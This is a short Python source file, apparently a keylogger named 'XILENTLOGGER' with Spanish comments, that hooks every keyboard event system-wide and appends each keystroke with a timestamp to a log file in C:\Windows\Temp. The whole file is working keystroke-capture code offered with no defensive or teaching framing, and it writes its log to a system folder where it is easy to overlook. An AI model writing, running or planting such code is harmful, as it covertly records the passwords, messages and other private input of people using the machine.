import os
import keyboard
from datetime import datetime
from pathlib import Path

LOG_PATH = Path("C:\\Windows\\Temp\\keylogs.txt")

class KeyLogger:
    def __init__(self):
        self.log_file = LOG_PATH
        self._ensure_log_file()
        
    def _ensure_log_file(self):
        if not self.log_file.exists():
            with open(self.log_file, 'w') as f:
                f.write(f"XILENTLOGGER - INICIO: {datetime.now()}\n")


    def _on_key_event(self, event):
        with open(self.log_file, 'a') as f:
            # Formato: [Fecha] Tecla: [event.name] (Tipo: {event.event_type})
            log_entry = f"[{datetime.now()}] Tecla: {event.name} (Tipo: {event.event_type})\n"
            f.write(log_entry)
    
    def start(self):
        keyboard.hook(self._on_key_event)
        print("[+] Keylogger en ejecución")
        
    def stop(self):
        keyboard.unhook_all()
        with open(self.log_file, 'a') as f:
            f.write(f"\nKeylogger Finalizado: {datetime.now()}")